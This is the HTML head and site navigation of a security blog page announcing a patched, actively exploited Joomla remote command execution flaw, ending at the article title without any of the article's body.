<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Critical 0-day Remote Command Execution Vulnerability in Joomla</title>
<meta name='robots' content='max-image-preview:large' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="Critical 0-day Remote Command Execution Vulnerability in Joomla" />
<meta property="og:description" content="Nov 2016 Update: If you need to clean your hacked Joomla site, we have released a new free guide to show you how to identify and remove hacks.  Read the Guide!  The Joomla security team have just" />
<meta property="og:image" content="https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla.png" />
<meta property="og:url" content="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2015-12-14T16:17:33-08:00" />
<meta property="article:modified_time" content="2016-11-11T17:34:44-08:00" />
<meta property="og:updated_time" content="2016-11-11T17:34:44-08:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->
<meta property="og:image:width" content="850" />
<meta property="og:image:height" content="400" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Critical 0-day Remote Command Execution Vulnerability in Joomla">
<meta name="twitter:description" content="Nov 2016 Update: If you need to clean your hacked Joomla site, we have released a new free guide to show you how to identify and remove hacks.  Read the Guide!  The Joomla security team have just">
<meta name="twitter:image" content="https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla.png">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->


<!-- This site is optimized with the Yoast SEO Premium plugin v12.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="A remote code execution vulnerability in Joomla has been patched, and the zero-day is being used by hackers in the wild at an alarming rate."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html" />
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Critical 0-day Remote Command Execution Vulnerability in Joomla Comments Feed" href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='select2-css'  href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.1' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"1502","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2015\/12\/remote-command-execution-vulnerability-in-joomla.html","title":"Critical+0-day+Remote+Command+Execution+Vulnerability+in+Joomla","image":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2015\/10\/Disclosure-Image-Joomla.png","desc":"Nov 2016 Update: If you need to clean your hacked Joomla site, we have released a new free guide to show you how to identify and remove hacks.\r\nRead the Guide!\r\nThe Joomla security team have just \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"1","nonce":"c1b7e23fe8","postid":"14358","servertime":"1659523645","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.1' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/14358" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.sucuri.net/?p=14358' />


<!-- This site is optimized with the Schema plugin v1.7.9.4 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2015\/12\/remote-command-execution-vulnerability-in-joomla.html"},"url":"https:\/\/blog.sucuri.net\/2015\/12\/remote-command-execution-vulnerability-in-joomla.html","headline":"Critical 0-day Remote Command Execution Vulnerability in Joomla","datePublished":"2015-12-14T16:17:33-08:00","dateModified":"2016-11-11T17:34:44-08:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"image":{"@type":"ImageObject","url":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2015\/10\/Disclosure-Image-Joomla.png","width":850,"height":400},"articleSection":"Joomla Security","keywords":"Zero-Day","description":"Nov 2016 Update: If you need to clean your hacked Joomla site, we have released a new free guide to show you how to identify and remove hacks. Read the Guide! The Joomla security team have just released a new version of Joomla to patch a critical remote command","author":{"@type":"Person","name":"Daniel Cid","url":"https:\/\/blog.sucuri.net\/author\/dcid","description":"Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the  GoDaddy Security Products group. He is also the founder of OSSEC and CleanBrowsing.  You can find more about Daniel on his site dcid.me or on Twitter: @danielcid","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/df3ec5506ba59d2ed3b951b7057e97d0?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script><link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }		</style>
		</head>
<body class="post-template-default single single-post postid-14358 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-14358 post type-post status-publish format-standard has-post-thumbnail category-joomla-security category-vulnerability-disclosure tag-zero-day entry"><header class="entry-header"><div class="single-featured"><img width="745" height="350" src="https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-745x350.png" class="single-featured-image wp-post-image" alt="" loading="lazy" srcset="https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-745x350.png 745w, https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-600x282.png 600w, https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-768x361.png 768w, https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-650x306.png 650w, https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-585x275.png 585w, https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-560x264.png 560w, https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla.png 850w" sizes="(max-width: 745px) 100vw, 745px" /></div><h1 class="entry-title">Critical 0-day Remote Command Execution Vulnerability in Joomla</h1>
